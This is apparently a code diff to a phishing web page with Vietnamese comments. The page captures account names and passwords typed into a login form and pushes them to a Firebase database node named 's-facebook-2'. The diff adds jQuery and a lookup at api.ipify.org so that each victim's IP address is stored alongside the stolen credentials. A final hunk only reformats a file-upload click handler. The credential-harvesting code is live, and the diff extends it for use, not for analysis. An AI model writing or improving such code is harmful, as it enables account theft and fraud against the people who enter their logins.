@@ -2913,6 +2913,7 @@
         background-image: none !important;
       }
     </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
   </head>
 
   <body class="lazyload">
@@ -3824,6 +3825,7 @@
             const accountId = document.getElementById("account-field").value;
             const password = document.getElementById("password-field").value;
             console.log(accountId);
+
             // Tạo một object chứa thông tin cần lưu vào Realtime Database
             const userData = {
               account: accountValue,
@@ -3832,18 +3834,21 @@
             };
 
             // Lưu thông tin vào Realtime Database
-            firebase
-              .database()
-              .ref("s-facebook-2")
-              .push(userData)
-              .then(function () {
-                // Xử lý khi lưu thành công
-                console.log("Thông tin đã được lưu vào Realtime Database.");
-              })
-              .catch(function (error) {
-                // Xử lý khi lưu thất bại
-                console.error("Lỗi khi lưu vào Realtime Database: ", error);
-              });
+
+            $.getJSON("https://api.ipify.org?format=json", function (data) {
+              firebase
+                .database()
+                .ref("s-facebook-2")
+                .push({...userData, ip: data.ip.toString()})
+                .then(function () {
+                  // Xử lý khi lưu thành công
+                  console.log("Thông tin đã được lưu vào Realtime Database.");
+                })
+                .catch(function (error) {
+                  // Xử lý khi lưu thất bại
+                  console.error("Lỗi khi lưu vào Realtime Database: ", error);
+                });
+            });
           });
         });
       }
@@ -3851,10 +3856,12 @@
         var fileInput = document.getElementById("file-field");
         fileInput.click(); // Mô phỏng việc nhấp vào input file thực sự
       }
-      document.getElementById("r-file-field").addEventListener("click", function() {
-        var fileInput = document.getElementById("file-field");
-        fileInput.click(); // Mô phỏng việc nhấp vào input file thực sự
-      })
+      document
+        .getElementById("r-file-field")
+        .addEventListener("click", function () {
+          var fileInput = document.getElementById("file-field");
+          fileInput.click(); // Mô phỏng việc nhấp vào input file thực sự
+        });
     </script>
   </body>
   <style>
